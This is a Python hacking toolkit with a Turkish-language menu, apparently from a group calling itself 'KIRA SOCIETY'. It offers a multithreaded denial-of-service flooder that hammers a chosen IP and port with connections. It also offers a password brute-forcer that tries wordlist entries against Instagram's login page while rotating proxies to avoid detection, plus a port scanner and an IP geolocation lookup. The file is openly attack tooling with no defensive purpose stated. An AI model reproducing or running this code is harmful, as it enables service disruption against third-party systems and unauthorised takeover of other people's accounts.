import socket
import threading
import requests
import os
import sys
import time
from datetime import datetime

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    ascii_art = r'''
██████████
██░░░░░░░░░░██
██░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░██
 ██░░░░░░░░░░░░░░░░██
  ██░░░░░░░░░░░░░░██
   ██░░░░░░░░░░░░██
    ██░░░░░░░░░░██
     ██░░░░░░░░██
      ██░░░░░░██
       ██░░░░██
     ██░░████░░██
   ██░░██    ██░░██
  ██░░██      ██░░██
 ██░░██        ██░░██
 ██░░██        ██░░██
  ████          ████

      ~KIRA SOCIETY~
      instagram: @0xkirasociety
'''
    print("\033[91m" + ascii_art + "\033[0m")

def ddos_attack():
    banner()
    print("\033[91mDDoS Toolu İşte Kanki\033[0m")
    target_ip = input("İp Gir: ")
    target_port = int(input("Port Gir: ") or 80)
    packet_count = int(input("Paket Sayısı: ") or 1000)
    thread_count = int(input("Thread Gir : ") or 10)
    
    attack_running = True
    
    def attack():
        sent = 0
        while attack_running and sent < packet_count:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
                sent += 1
                print(f"[{datetime.now()}] [+] Gönderilen Paket Sayısı: {sent} Paketlerin Gittiği Yer {target_ip}:{target_port}")
                sock.close()
            except Exception as e:
                print(f"[!] Error: {e}")
            time.sleep(0.01)
    
    print(f"\nSaldırı {target_ip}:{target_port} Üzerinde Başlatılıyor. ")
    threads = []
    for i in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)
    
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\nSaldırı Duruyor...")
        attack_running = False
        for thread in threads:
            thread.join()
    
    print("Bitti.")
    input("Entere Bas Ve Ana Menüye Dön.") 

def brute_force():
    username = input("Instagram kullanıcı adı: ")
    password_file = input("Şifrelerin bulunduğu dosya (örn: passwords.txt): ")
    proxy_file = input("Proxylerin bulunduğu dosya (örn: proxy.txt): ")

    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Şifre dosyası bulunamadı!")
        sys.exit(1)
    
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Proxy dosyası bulunamadı!")
        sys.exit(1)
    
    login_url = "https://www.instagram.com/accounts/login/"
    
    login_data = {
        'username': username,
        'password': '',
        'queryParams': '',
        'optIntoOneTap': 'false'
    }
 
    for password in passwords:
        current_proxy = None
        
        if proxies:
            proxy_address = proxies[int(time.time()) % len(proxies)]
            current_proxy = {
                'http': f'http://{proxy_address}',
                'https': f'http://{proxy_address}'
            }
  
        login_data['password'] = password
        
        try:
            response = requests.post(
                login_url, 
                data=login_data,
                proxies=current_proxy,
                timeout=10
            )
            
            if response.status_code == 200 and 'login' not in response.url:
                print(f"[+] Başarılı! Şifre: {password}")
                return
           
            elif response.status_code == 200:
                print(f"[-] Hatalı şifre: {password}")
            
        except Exception as e:
            print(f"[!] Hata: {e}")
   
    print("[-] Tüm şifreler denenmiş, giriş başarısız!")
    input("Entere Basarak Ana Menüye Dön...")

def port_scanner():
    banner()
    print("\033[91mPort Tarayıcı\033[0m")
    target_ip = input("İp Gir: ")
    start_port = int(input("Başlangıç Portu : ") or 1)
    end_port = int(input("Sınır Port: ") or 1024)
    
    print(f"\nTaranan İp: {target_ip} Başlangıç Portundan {start_port} Buna {end_port}...")
    
    open_ports = []
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            print(f"[+] Port {port} is open")
            open_ports.append(port)
        sock.close()
    
    print(f"\nTarama Tamamlandı. Bulunan {len(open_ports)} açık portlar.")
    if open_ports:
        print("Açık Portlar:", ", ".join(map(str, open_ports)))
    input("Entere Basarak Ana Menüye Dön...")

def ip_lookup():
    banner()
    print("\033[91mIP Lookup Tool\033[0m")
    ip = input("İp Adresi Gir ").strip()
    
    print(f"\nBakılıyor {ip}...")
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        if response['status'] == 'success':
            print("\nIP Information:")
            print(f"Country: {response.get('country', 'N/A')}")
            print(f"Region: {response.get('regionName', 'N/A')}")
            print(f"City: {response.get('city', 'N/A')}")
            print(f"ISP: {response.get('isp', 'N/A')}")
            print(f"Organization: {response.get('org', 'N/A')}")
            print(f"AS: {response.get('as', 'N/A')}")
            print(f"Latitude: {response.get('lat', 'N/A')}")
            print(f"Longitude: {response.get('lon', 'N/A')}")
            print(f"Timezone: {response.get('timezone', 'N/A')}")
        else:
            print("İp Yanlış Yada Api İsteği Başarısız.")
    except Exception as e:
        print(f"Error: {e}")
    
    input("Entere Basarak Ana Menüye Dön...")

def main():
    while True:
        banner()
        print("\033[91m")
        print("  ╔════════════════════════╗")
        print("  ║ [1] DDoS Attack                 ║")
        print("  ║ [2] Brute Force                 ║")
        print("  ║ [3] Port Scanner                ║")
        print("  ║ [4] IP Lookup                   ║")
        print("  ║ [0] Exit                        ║")
        print("  ╚════════════════════════╝")
        print("\033[0m")
        
        choice = input("Seç: ").strip()
        
        if choice == "1":
            ddos_attack()
        elif choice == "2":
            brute_force()
        elif choice == "3":
            port_scanner()
        elif choice == "4":
            ip_lookup()
        elif choice == "0":
            print("Çıkış Yapılıyor...")
            break
        else:
            print("Yanlış Seçim Kanki.")
            time.sleep(1)

if __name__ == "__main__":
    main()
